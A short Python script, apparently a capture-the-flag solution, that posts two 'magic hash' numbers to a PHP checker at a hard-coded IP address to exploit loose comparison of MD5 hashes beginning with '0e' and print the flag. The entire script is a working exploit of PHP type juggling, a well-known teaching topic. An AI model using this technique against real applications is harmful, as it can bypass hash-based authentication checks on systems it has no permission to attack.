#!/usr/bin/env python3
import requests

target = "http://34.78.240.11:57001/checker.php"

#MD5 Collision
#Check CTF Katana for MD5 Hashes that evaluate to 0e
#Combine with weak comparison and get the flag :)
r = requests.post(target, data={"num1":"240610708", "num2":"0e215962017"})
flag = r.text
print(flag)
